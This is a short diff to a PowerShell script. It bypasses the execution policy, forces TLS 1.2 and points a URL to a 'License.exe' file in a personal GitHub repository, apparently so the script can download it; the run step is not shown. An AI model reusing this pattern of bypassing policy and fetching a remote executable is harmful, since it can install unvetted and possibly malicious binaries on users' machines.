@@ -4,7 +4,7 @@ Set-ExecutionPolicy Bypass -Scope Process
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
 
-$url = "https://raw.githubusercontent.com/chhai-dev/chhai-dev.github.io/main/License.exe"
+$url = "https://raw.githubusercontent.com/chhai-dev/chhai-dev.github.io/main/remote/License.exe"
 Set-ExecutionPolicy Bypass -Scope Process
 
 $rand = Get-Random -Maximum 1000
